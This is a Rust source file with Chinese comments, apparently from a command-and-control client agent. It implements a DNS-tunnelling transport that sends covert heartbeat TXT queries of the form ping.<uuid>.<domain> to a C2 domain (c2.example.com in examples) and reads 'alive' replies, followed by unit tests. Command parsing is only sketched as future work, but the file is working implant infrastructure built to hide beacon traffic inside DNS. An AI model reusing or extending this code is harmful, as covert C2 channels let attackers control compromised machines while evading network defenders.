// DNS 传输实现
//
// 实现 Transport trait，通过 DNS TXT 查询进行隐蔽通信。
// 使用 DNS 隧道技术，将数据编码在 DNS 查询和响应中。
//
// 协议设计：
// - 客户端通过 DNS TXT 查询发送心跳：ping.<uuid>.<domain>
// - 服务端通过 TXT 记录响应："alive" 表示存活
// - DNS 是无连接协议，每次查询都是独立的

use crate::error::{ClientError, Result};
use crate::transport::Transport;
use async_trait::async_trait;
use log::{debug, error, info, warn};
use std::time::Duration;
use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
use trust_dns_resolver::TokioAsyncResolver;

/// DNS 传输实现
/// 
/// 通过 DNS TXT 查询实现隐蔽通信。
/// DNS 是无连接协议，适合用于心跳和轻量级数据传输。
pub struct DnsTransport {
    /// C2 服务器域名（例如：c2.example.com）
    domain: String,
    /// 客户端 UUID（用于构造查询）
    client_uuid: Option<String>,
    /// DNS 解析器
    resolver: TokioAsyncResolver,
    /// 连接状态（DNS 是无连接的，这里仅用于逻辑标记）
    connected: bool,
}

impl DnsTransport {
    /// 创建新的 DNS 传输
    /// 
    /// # 参数
    /// 
    /// * `url` - DNS 服务器 URL，格式：`dns://c2.example.com`
    /// 
    /// # 示例
    /// 
    /// ```no_run
    /// use c2_client_agent::transport::dns::DnsTransport;
    /// 
    /// let transport = DnsTransport::new("dns://c2.example.com".to_string());
    /// ```
    pub fn new(url: String) -> Self {
        // 清理 URL：去除 null 字节和空白字符
        let cleaned_url = url
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim()
            .to_string();
        
        // 解析域名：支持 dns://domain, ws://domain/path, 纯 domain 等多种输入
        let mut domain = cleaned_url;
        
        // 移除所有已知的协议头
        if domain.starts_with("ws://") {
            domain = domain.replace("ws://", "");
        } else if domain.starts_with("wss://") {
            domain = domain.replace("wss://", "");
        } else if domain.starts_with("dns://") {
            domain = domain.replace("dns://", "");
        }

        // 移除路径部分 (如有)
        if let Some(pos) = domain.find('/') {
            domain = domain[..pos].to_string();
        }

        debug!("DnsTransport created with domain: {}", domain);
        
        // 创建 DNS 解析器
        // 使用 Google DNS (8.8.8.8) 和 Cloudflare DNS (1.1.1.1) 作为上游
        let resolver = Self::create_resolver();
        
        Self {
            domain,
            client_uuid: None,
            resolver,
            connected: false,
        }
    }
    
    /// 创建 DNS 解析器
    /// 
    /// 使用公共 DNS 服务器（Google 8.8.8.8 和 Cloudflare 1.1.1.1）
    /// 或自定义 DNS 服务器（如果配置了）。
    fn create_resolver() -> TokioAsyncResolver {
        use std::net::SocketAddr;
        use trust_dns_resolver::config::NameServerConfig;
        
        let mut opts = ResolverOpts::default();
        opts.timeout = Duration::from_secs(5);
        opts.attempts = 2;
        
        // 检查是否配置了自定义 DNS 解析器
        if let Some(resolver_addr) = crate::config::get_dns_resolver() {
            debug!("Using custom DNS resolver: {}", resolver_addr);
            
            // 解析 IP:PORT 格式
            if let Ok(socket_addr) = resolver_addr.parse::<SocketAddr>() {
                // 创建自定义配置
                let mut config = ResolverConfig::new();
                let name_server = NameServerConfig {
                    socket_addr,
                    protocol: trust_dns_resolver::config::Protocol::Udp,
                    tls_dns_name: None,
                    trust_negative_responses: true,
                    bind_addr: None,
                };
                config.add_name_server(name_server);
                
                info!("DNS resolver configured with custom server: {}", resolver_addr);
                return TokioAsyncResolver::tokio(config, opts);
            } else {
                warn!("Failed to parse custom DNS resolver address: {}", resolver_addr);
                warn!("Falling back to Google DNS");
            }
        }
        
        // 使用 Google DNS (8.8.8.8, 8.8.4.4) 作为默认
        let config = ResolverConfig::google();
        debug!("DNS resolver created with Google DNS (8.8.8.8)");
        TokioAsyncResolver::tokio(config, opts)
    }
    
    /// 设置客户端 UUID
    /// 
    /// 必须在 connect() 之前调用，用于构造 DNS 查询。
    pub fn set_client_uuid(&mut self, uuid: String) {
        debug!("Setting client UUID: {}", uuid);
        self.client_uuid = Some(uuid);
    }
    
    /// 获取域名
    pub fn domain(&self) -> &str {
        &self.domain
    }
    
    /// 构造 DNS 查询域名
    /// 
    /// 格式：ping.<uuid>.<domain>
    /// 例如：ping.550e8400-e29b-41d4-a716-446655440000.c2.example.com
    fn build_query_domain(&self) -> Result<String> {
        let uuid = self.client_uuid.as_ref().ok_or_else(|| {
            ClientError::ConnectionError(
                "Client UUID not set. Call set_client_uuid() before using DNS transport".to_string()
            )
        })?;
        
        // 构造查询域名：ping.<uuid>.<domain>
        let query = format!("ping.{}.{}", uuid, self.domain);
        debug!("Built DNS query domain: {}", query);
        
        Ok(query)
    }
    
    /// 执行 DNS TXT 查询
    /// 
    /// 查询指定域名的 TXT 记录。
    async fn query_txt(&self, domain: &str) -> Result<Vec<String>> {
        debug!("Querying TXT record for: {}", domain);
        
        match self.resolver.txt_lookup(domain).await {
            Ok(response) => {
                let mut results = Vec::new();
                
                for record in response.iter() {
                    // 将 TXT 记录的字节数据转换为字符串
                    for data in record.iter() {
                        if let Ok(text) = String::from_utf8(data.to_vec()) {
                            debug!("Received TXT record: {}", text);
                            results.push(text);
                        }
                    }
                }
                
                if results.is_empty() {
                    warn!("No TXT records found for: {}", domain);
                }
                
                Ok(results)
            }
            Err(e) => {
                error!("DNS TXT query failed for {}: {}", domain, e);
                Err(ClientError::ConnectionError(
                    format!("DNS query failed: {}", e)
                ))
            }
        }
    }
}

#[async_trait]
impl Transport for DnsTransport {
    async fn connect(&mut self) -> Result<()> {
        info!("DNS transport connecting to domain: {}", self.domain);
        
        // DNS 是无连接协议，这里只是逻辑上的"连接"
        // 我们可以执行一次测试查询来验证域名是否可达
        
        if self.client_uuid.is_none() {
            warn!("Client UUID not set, DNS queries will fail until set_client_uuid() is called");
        }
        
        // 标记为已连接
        self.connected = true;
        
        info!("DNS transport connected (connectionless protocol)");
        Ok(())
    }
    
    async fn send(&mut self, _data: &[u8]) -> Result<()> {
        // 在 DNS 传输中，send() 触发心跳查询
        // 数据参数在当前实现中未使用（未来可用于编码更多信息）
        
        debug!("DNS send: triggering heartbeat query");
        
        // 构造查询域名
        let query_domain = self.build_query_domain()?;
        
        // 执行 TXT 查询
        let responses = self.query_txt(&query_domain).await?;
        
        // 检查响应
        if responses.is_empty() {
            warn!("No response from DNS server");
        } else {
            for response in &responses {
                debug!("DNS response: {}", response);
                if response == "alive" {
                    info!("Received 'alive' heartbeat from C2 server");
                }
            }
        }
        
        Ok(())
    }
    
    async fn receive(&mut self) -> Result<Vec<u8>> {
        // 在 DNS 传输中，receive() 通常在 send() 之后立即调用
        // 或者在轮询循环中调用
        
        debug!("DNS receive: checking for messages");
        
        // 构造查询域名
        let query_domain = self.build_query_domain()?;
        
        // 执行 TXT 查询
        let responses = self.query_txt(&query_domain).await?;
        
        // 解析响应
        if responses.is_empty() {
            // 没有响应，返回空数据
            debug!("No DNS response, returning empty");
            return Ok(Vec::new());
        }
        
        // 检查是否为心跳响应
        for response in &responses {
            if response == "alive" {
                // 心跳确认，返回空数据（表示连接正常但无命令）
                debug!("Heartbeat acknowledged, no commands");
                return Ok(Vec::new());
            }
        }
        
        // 未来扩展：这里可以解析其他类型的响应
        // 例如：命令数据、配置更新等
        
        warn!("Received unknown DNS response: {:?}", responses);
        Ok(Vec::new())
    }
    
    fn is_connected(&self) -> bool {
        self.connected
    }
    
    fn initialize(&mut self, client_uuid: &str) {
        self.set_client_uuid(client_uuid.to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_transport_creation() {
        let transport = DnsTransport::new("dns://c2.example.com".to_string());
        assert_eq!(transport.domain(), "c2.example.com");
        assert!(!transport.is_connected());
    }

    #[test]
    fn test_dns_transport_url_cleaning() {
        // 测试 null 字节清理
        let transport = DnsTransport::new(
            "dns://c2.example.com\0\0\0\0\0\0\0\0".to_string()
        );
        assert_eq!(transport.domain(), "c2.example.com");
    }

    #[test]
    fn test_dns_transport_url_with_leading_nulls() {
        // 测试前导 null 字节清理
        let transport = DnsTransport::new(
            "\0\0dns://test.local\0\0".to_string()
        );
        assert_eq!(transport.domain(), "test.local");
    }

    #[test]
    fn test_dns_transport_url_without_prefix() {
        // 测试没有 dns:// 前缀的情况
        let transport = DnsTransport::new("c2.example.com".to_string());
        assert_eq!(transport.domain(), "c2.example.com");
    }

    #[test]
    fn test_set_client_uuid() {
        let mut transport = DnsTransport::new("dns://c2.example.com".to_string());
        let uuid = "550e8400-e29b-41d4-a716-446655440000".to_string();
        
        transport.set_client_uuid(uuid.clone());
        
        // 验证 UUID 已设置（通过构造查询域名）
        let query = transport.build_query_domain().unwrap();
        assert_eq!(query, "ping.550e8400-e29b-41d4-a716-446655440000.c2.example.com");
    }

    #[test]
    fn test_build_query_domain_without_uuid() {
        let transport = DnsTransport::new("dns://c2.example.com".to_string());
        
        // 没有设置 UUID 应该返回错误
        let result = transport.build_query_domain();
        assert!(result.is_err());
    }

    #[test]
    fn test_build_query_domain_format() {
        let mut transport = DnsTransport::new("dns://c2.example.com".to_string());
        transport.set_client_uuid("test-uuid-123".to_string());
        
        let query = transport.build_query_domain().unwrap();
        assert_eq!(query, "ping.test-uuid-123.c2.example.com");
        
        // 验证格式：ping.<uuid>.<domain>
        assert!(query.starts_with("ping."));
        assert!(query.ends_with(".c2.example.com"));
    }

    #[test]
    fn test_dns_transport_not_connected_initially() {
        let transport = DnsTransport::new("dns://c2.example.com".to_string());
        assert!(!transport.is_connected());
    }
    
    // 注意：实际的 DNS 查询测试需要运行中的 DNS 服务器，
    // 这些测试将在集成测试中进行
}
